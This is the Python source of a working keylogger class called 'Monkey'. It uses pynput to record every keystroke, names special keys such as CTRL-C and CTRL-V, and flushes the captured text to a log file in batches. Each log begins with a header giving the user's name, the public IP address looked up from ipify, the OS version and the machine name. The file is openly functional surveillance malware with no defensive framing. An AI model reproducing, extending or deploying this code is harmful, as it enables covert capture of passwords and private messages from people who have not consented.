import time

from os import path, sep
from sys import exit
from platform import uname
from requests import get
from _thread import start_new_thread
from pynput.keyboard import Listener

from config import MonkeyConfig


class Monkey:
    def __init__(self, config: MonkeyConfig) -> None:
        self._logged_data = []
        self._count = 0
        self._last_time = time.time()
        self._log_file = config.filepath

        self._substitution = \
            {'Key.enter': '[ENTER]\n','Key.backspace': '[BACKSPACE]',
            'Key.space': ' ','Key.alt': '[ALT]','Key.alt_r': '[ALT]',
            'Key.tab': '[TAB]', 'Key.delete': '[DEL]','Key.ctrl_l': '[CTRL]',
            'Key.ctrl': '[CTRL]','Key.alt_l': '[ALT]','Key.alt_gr': '[ALT]',
            'Key.ctrl_r': '[CTRL]','Key.left': '[LEFT ARROW]',
            'Key.right': '[RIGHT ARROW]','Key.up': '[UP ARROW]',
            'Key.down': '[DOWN ARROW]','Key.shift': '[SHIFT]',
            'Key.shift_r': '[SHIFT]','\\x13': '[CTRL-S]','\\x17': '[CTRL-W]',
            'Key.caps_lock': '[CAPS LK]','\\x01': '[CTRL-A]',
            'Key.menu': '[MENU]','Key.cmd': '[WINDOWS KEY]',
            'Key.print_screen': '[PRNT SCR]','\\x03':'[CTRL-C]',
            '\\x16': '[CTRL-V]'}

    def _write_file(self) -> None:
        if not path.exists(self._log_file):
            with open(self._log_file, 'w') as f:
                f.write(self._get_header_msg())
            
        with open(self._log_file, 'a') as f:
            f.write("".join(self._logged_data))
        
        self._logged_data.clear()

    # add header to file to with extra info
    def _get_header_msg(self) -> str:
        datetime = time.ctime(time.time())
        user = path.expanduser('~').split(sep)[2]
        try:
            publicIP = get('https://api.ipify.org/').text
        except:
            publicIP = "Null"
        uname_result = uname()

        return f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ Username: {user}\n  *~ Public-IP: {publicIP}\n  *~ OS: {uname_result.system} {uname_result.version}\n  *~ Node: {uname_result.node}\n\n'


    def _on_press(self, key) -> None:
        # add newline if there is a gap in typing
        # it will make the log more readable
        current_time = time.time()
        if current_time - self._last_time >= 5:
            self._logged_data.append("\n")
        self._last_time = current_time

        # replace special keys with their name
        key = str(key).strip('\'')
        if key in self._substitution:
            self._logged_data.append(self._substitution[key])
        else:
            self._logged_data.append(key)

        # write data to file after 30 words
        self._count+=1
        if self._count >= 30:
            start_new_thread(self._write_file, ())
            self._count=0

    def run(self) -> None:
        try:
            with Listener(on_press=self._on_press) as listener:
                listener.join()
        finally:
            self._write_file()


if __name__ == '__main__':
    try:
        Monkey(MonkeyConfig()).run()
    finally:
        exit(0)